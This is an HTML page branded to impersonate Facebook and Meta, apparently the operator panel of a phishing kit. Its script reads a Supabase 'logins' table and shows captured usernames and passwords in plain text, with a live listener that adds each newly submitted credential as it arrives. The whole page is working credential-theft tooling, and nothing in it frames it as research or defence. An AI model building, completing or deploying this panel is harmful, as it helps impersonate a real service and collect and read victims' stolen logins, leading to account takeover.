<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook â€“ Confirm Your Identity</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: Arial, sans-serif;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }
    .confirmation-container {
      background: white;
      max-width: 400px;
      width: 90%;
      padding: 30px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .fb-logo {
      margin-bottom: 20px;
    }
    .fb-logo img {
      height: 40px;
    }
    h2 {
      color: #1c1e21;
      font-size: 20px;
      margin-bottom: 10px;
    }
    p {
      color: #606770;
      font-size: 14px;
      margin-bottom: 25px;
      line-height: 1.4;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 10px;
      border-bottom: 1px solid #ccc;
      text-align: left;
    }
    th {
      background-color: #1877f2;
      color: white;
    }
    .meta-footer {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background-color: white;
      padding: 10px 20px;
      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
      text-align: center;
    }
    .top-line {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .top-line img {
      height: 24px;
    }
    .meta-text {
      font-weight: bold;
      font-size: 1.1rem;
      color: #333;
    }
    .bottom-line {
      font-size: 0.9rem;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="confirmation-container">
    <div class="fb-logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
    </div>
    <h2>Login Records</h2>
    <p>Live view of usernames and passwords submitted.</p>

    <table>
      <thead>
        <tr>
          <th>Username</th>
          <th>Password</th>
        </tr>
      </thead>
      <tbody id="logins-table-body">
        <!-- Dynamic rows -->
      </tbody>
    </table>
  </div>

  <div class="meta-footer">
    <div class="top-line">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Meta logo" />
      <div class="meta-text">Meta</div>
    </div>
    <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
  <script>
    const SUPABASE_URL = 'https://YOUR_PROJECT.supabase.co';
    const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';

    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    async function fetchLogins() {
      const { data, error } = await supabase
        .from('logins')
        .select('username, password')
        .order('id', { ascending: false });

      if (error) {
        console.error('Error fetching logins:', error);
        return;
      }

      const tableBody = document.getElementById('logins-table-body');
      tableBody.innerHTML = '';

      data.forEach(entry => {
        const row = document.createElement('tr');
        row.innerHTML = `
          <td>${entry.username}</td>
          <td>${entry.password}</td>
        `;
        tableBody.appendChild(row);
      });
    }

    // Real-time listener
    supabase
      .channel('realtime:logins')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'logins' }, payload => {
        const entry = payload.new;
        const row = document.createElement('tr');
        row.innerHTML = `
          <td>${entry.username}</td>
          <td>${entry.password}</td>
        `;
        document.getElementById('logins-table-body').prepend(row);
      })
      .subscribe();

    fetchLogins();
  </script>
</body>
</html>
